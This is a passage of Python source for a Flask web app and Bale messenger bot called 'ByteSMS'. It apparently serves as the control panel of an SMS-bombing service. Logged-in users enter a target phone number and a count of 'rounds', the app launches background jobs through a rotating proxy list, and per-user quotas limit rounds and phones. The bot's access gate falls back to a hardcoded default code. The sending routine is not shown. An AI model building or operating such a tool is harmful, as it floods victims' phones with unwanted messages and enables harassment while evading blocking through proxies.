    return Response(content, mimetype='text/plain',
                    headers={'Content-Disposition': 'attachment; filename="proxies.txt"'})

@app.route('/api/proxies/import', methods=['POST'])
@admin_required
def api_proxies_import():
    d = request.get_json(silent=True) or {}
    raw = d.get('proxies', [])
    if isinstance(raw, str): raw = [l for l in raw.splitlines() if l.strip()]
    added = PROXIES.add(raw)
    return jsonify({'ok': True, 'added': added})

# ===== Restart =====
restart_lock = Lock(); restart_in_progress = False

def _do_restart():
    time.sleep(0.4)
    if os.name == 'nt':
        try:
            subprocess.Popen([sys.executable, str(BASE_DIR / 'app.py')],
                             cwd=str(BASE_DIR), creationflags=0x00000010)
            time.sleep(1)
        finally: os._exit(0)
    else:
        try: os.execv(sys.executable, [sys.executable, str(BASE_DIR / 'app.py')])
        except Exception as e:
            print(f"[!] Restart failed: {e}")
            try: subprocess.Popen([sys.executable, str(BASE_DIR / 'app.py')], cwd=str(BASE_DIR))
            finally: os._exit(0)

@app.route('/api/restart', methods=['POST'])
@admin_required
def api_restart():
    global restart_in_progress
    with restart_lock:
        if restart_in_progress: return jsonify({'error': 'Restart already in progress'}), 400
        restart_in_progress = True
    Thread(target=_do_restart, daemon=True).start()
    return jsonify({'ok': True})

# ============ Status updater ============
def _status_updater():
    while True:
        time.sleep(20)
        try: USERS.update_statuses(now_ts())
        except: pass

Thread(target=_status_updater, daemon=True).start()

# ============ Bale Bot ============
class BaleBot:
    def __init__(self, token):
        self.token = token
        self.base_url = f"https://tapi.bale.ai/bot{token}"
        self.offset = 0
        self.user_states = {} 
        self.authenticated = {} 
        self.temp_data = {} 
        self.thread = Thread(target=self._polling_loop, daemon=True)
        self.thread.start()
        
    def _api_call(self, method, params=None):
        try:
            url = f"{self.base_url}/{method}"
            r = requests.post(url, json=params or {}, timeout=10)
            return r.json()
        except Exception as e:
            return None
            
    def _polling_loop(self):
        print("[BaleBot] Started polling.")
        while True:
            try:
                res = self._api_call('getUpdates', {'offset': self.offset, 'timeout': 30})
                if res and res.get('ok'):
                    for update in res.get('result', []):
                        self.offset = update['update_id'] + 1
                        self._handle_update(update)
            except Exception as e:
                pass
            time.sleep(1)
            
    def _send(self, chat_id, text, keyboard=None):
        params = {'chat_id': chat_id, 'text': text}
        if keyboard: params['reply_markup'] = {'inline_keyboard': keyboard}
        return self._api_call('sendMessage', params)
        
    def _edit(self, chat_id, msg_id, text, keyboard=None):
        params = {'chat_id': chat_id, 'message_id': msg_id, 'text': text}
        if keyboard: params['reply_markup'] = {'inline_keyboard': keyboard}
        return self._api_call('editMessageText', params)
        
    def _answer_cb(self, cb_id):
        self._api_call('answerCallbackQuery', {'callback_query_id': cb_id})

    def _get_main_menu(self, is_admin):
        kb = [
            [{'text': '📊 Status', 'callback_data': 'status'}],
            [{'text': '▶️ Run Operation', 'callback_data': 'op_run'}],
            [{'text': '🛑 Stop Operation', 'callback_data': 'op_stop'}],
            [{'text': '🌐 Proxies', 'callback_data': 'menu_proxies'}]
        ]
        if is_admin:
            kb.append([{'text': '👥 Users', 'callback_data': 'menu_users'}])
            kb.append([{'text': '⚙️ Settings', 'callback_data': 'menu_settings'}])
        kb.append([{'text': '🚪 Logout', 'callback_data': 'logout'}])
        return kb
        
    def _handle_update(self, upd):
        if 'message' in upd:
            msg = upd['message']
            chat_id = msg['chat']['id']
            text = msg.get('text', '').strip()
            
            if text == '/start':
                self.user_states[chat_id] = 'awaiting_code'
                self._send(chat_id, "🔐 Please enter the security code to access the panel:")
                return
                
            state = self.user_states.get(chat_id)
            if not state:
                self.user_states[chat_id] = 'awaiting_code'
                self._send(chat_id, "🔐 Please enter the security code to access the panel:")
                return

            if state == 'awaiting_code':
                expected_code = SETTINGS.get('bale_security_code', 'ByteSMS_RD')
                if text == expected_code:
                    self.user_states[chat_id] = 'awaiting_username'
                    self._send(chat_id, "✅ Code correct.\nPlease enter your Username:")
                else:
                    self._send(chat_id, "❌ Invalid security code. Try again:")
                    
            elif state == 'awaiting_username':
                self.temp_data[chat_id] = {'username': text}
                self.user_states[chat_id] = 'awaiting_password'
                self._send(chat_id, "Now enter your Password:")
                
            elif state == 'awaiting_password':
                u = self.temp_data[chat_id]['username']
                p = text
                if USERS.check_password(u, p):
                    self.authenticated[chat_id] = u
                    self.user_states[chat_id] = 'menu'
                    is_admin = USERS.get(u).get('role') == 'admin'
                    self._send(chat_id, f"✅ Logged in as {u}.\nChoose an option:", self._get_main_menu(is_admin))
                else:
                    self.user_states[chat_id] = 'awaiting_username'
                    self._send(chat_id, "❌ Invalid credentials. Try again.\nEnter Username:")
                    
            elif state == 'op_phone':
                self.temp_data[chat_id]['phone'] = text
                self.user_states[chat_id] = 'op_rounds'
                self._send(chat_id, "Enter the number of Rounds:")
                
            elif state == 'op_rounds':
                try:
                    rounds = int(text)
                    phone = self.temp_data[chat_id]['phone']
                    u = self.authenticated[chat_id]
                    with job_lock:
                        st = job_states.setdefault(u, {'running': False, 'phase': '', 'round': 0, 'total_rounds': 0})
                        if st['running']:
                            self._send(chat_id, "⚠️ An operation is already running.")
                            return
                        st.update({'running': True, 'phase': 'Starting...', 'round': 0, 'total_rounds': rounds})
                        job_logs[u] = []; stop_flags[u] = False
                    USERS.consume(u, rounds, phone)
                    log_id = LOGS.add(username=u, phone=normalize_phone(phone)['local'],
                                      rounds=rounds, start_time=now_iso(), end_time=None, status='running')
                    Thread(target=run_job, args=(u, log_id, phone, rounds), daemon=True).start()
                    
                    self.user_states[chat_id] = 'menu'
                    self._send(chat_id, f"🚀 Operation started for {phone} with {rounds} rounds.")
                except ValueError:
                    self._send(chat_id, "Invalid number. Enter rounds:")
                    
            elif state == 'add_proxy':
                raw = text
                added = PROXIES.add([l.strip() for l in raw.splitlines() if l.strip()])
                self.user_states[chat_id] = 'menu'
                self._send(chat_id, f"✅ Added {added} proxies.", self._get_main_menu(True))
                
            elif state == 'add_user':
                parts = text.split()
                if len(parts) >= 2:
                    u, p = parts[0], parts[1]
                    mr = int(parts[2]) if len(parts) > 2 else 24
                    mp = int(parts[3]) if len(parts) > 3 else 2
                    ok, err = USERS.create(u, p, mr, mp)
                    if ok:
                        self._send(chat_id, f"✅ User {u} created.", self._get_main_menu(True))
                    else:
                        self._send(chat_id, f"❌ Error: {err}", self._get_main_menu(True))
                else:
                    self._send(chat_id, "Format: username password [max_rounds] [max_phones]")
                self.user_states[chat_id] = 'menu'
                
        elif 'callback_query' in upd:
            cb = upd['callback_query']
            chat_id = cb['message']['chat']['id']
            msg_id = cb['message']['message_id']
            data = cb['data']
            self._answer_cb(cb['id'])
            
            u = self.authenticated.get(chat_id)
            if not u:
                self._send(chat_id, "Session expired. Enter security code:")
                self.user_states[chat_id] = 'awaiting_code'
                return
                
            is_admin = USERS.get(u).get('role') == 'admin'
            
            if data == 'logout':
                self.authenticated.pop(chat_id, None)
                self.user_states.pop(chat_id, None)
                self._edit(chat_id, msg_id, "Logged out. Enter security code:")
            elif data == 'menu':
                self._edit(chat_id, msg_id, "Main Menu:", self._get_main_menu(is_admin))
            elif data == 'status':
                p = PINGER.get()['current']
                txt = f"🌐 Network: {'Online' if p['online'] else 'Offline'}\n"
                txt += f"📶 Avg Ping: {p['avg_ms'] or '--'} ms\n"
                txt += f"🇬 Google: {p['google'] or '--'} ms\n"
                txt += f"☁️ Cloudflare: {p['cloudflare'] or '--'} ms\n\n"
                users = USERS.all()
                online = sum(1 for x in users.values() if x.get('status') == 'online')
                txt += f"👥 Users Online: {online} / {len(users)}"
                self._edit(chat_id, msg_id, txt, [[{'text': '🔙 Back', 'callback_data': 'menu'}]])
            elif data == 'op_run':
                self.user_states[chat_id] = 'op_phone'
                self._send(chat_id, "Enter the Phone Number (e.g. 09123456789):")
            elif data == 'op_stop':
                set_stop(u, True)
                self._send(chat_id, "🛑 Stop request sent.")
            elif data == 'menu_proxies':
                cnt = len(PROXIES.all())
                txt = f"🌐 Proxy List\nTotal: {cnt} proxies."
                kb = [
                    [{'text': '➕ Add Proxies', 'callback_data': 'proxy_add'}],
                    [{'text': '🗑 Clear All', 'callback_data': 'proxy_clear'}],
                    [{'text': '🔙 Back', 'callback_data': 'menu'}]
                ]
                self._edit(chat_id, msg_id, txt, kb)
            elif data == 'proxy_add':
                self.user_states[chat_id] = 'add_proxy'
                self._send(chat_id, "Send proxies (one per line):")
            elif data == 'proxy_clear':
                PROXIES.clear()
                self._edit(chat_id, msg_id, "✅ Proxy list cleared.", [[{'text': '🔙 Back', 'callback_data': 'menu'}]])
            elif data == 'menu_users':
                if not is_admin: return
                users = USERS.all()
                txt = "Users:\n"
                for name, info in users.items():
                    txt += f"• {name} ({info['role']})\n"
                kb = [
                    [{'text': '➕ Add User', 'callback_data': 'user_add'}],
                    [{'text': '🔙 Back', 'callback_data': 'menu'}]
                ]
                self._edit(chat_id, msg_id, txt, kb)
            elif data == 'user_add':
                if not is_admin: return
                self.user_states[chat_id] = 'add_user'
                self._send(chat_id, "Send: username password [max_rounds] [max_phones]")
            elif data == 'menu_settings':
                if not is_admin: return
                s = SETTINGS.all()
                txt = f"⚙️ Settings\nMax Rounds: {s['max_rounds_per_job']}\nPing Interval: {s['ping_interval']}s"
                self._edit(chat_id, msg_id, txt, [[{'text': '🔙 Back', 'callback_data': 'menu'}]])

# Start bot if token exists
_bale_token = SETTINGS.get('bale_bot_token', '')
if _bale_token:
    BaleBot(_bale_token)

def main():
    host = CFG['HOST']; port = CFG['PORT']
    print()
    print("  ╔══════════════════════════════════════════════════╗")
    print("  ║  ByteSMS v1.0                                    ║")
    print("  ║  Designed & developed by AliXByte                ║")
    print("  ║  Sponsored by www.pixelshop24.com                ║")
    print("  ╚══════════════════════════════════════════════════╝")
    print(f"  Base     : {BASE_DIR}")
    print(f"  Listening: http://{host}:{port}")
    if host == '0.0.0.0':
        print(f"  Local    : http://localhost:{port}")
        print(f"  Network  : http://<LAN-IP>:{port}")
    print("  ────────────────────────────────────────────────")
    print()
    app.run(host=host, port=port, threaded=True, debug=False, use_reloader=False)

if __name__ == '__main__':
    main()
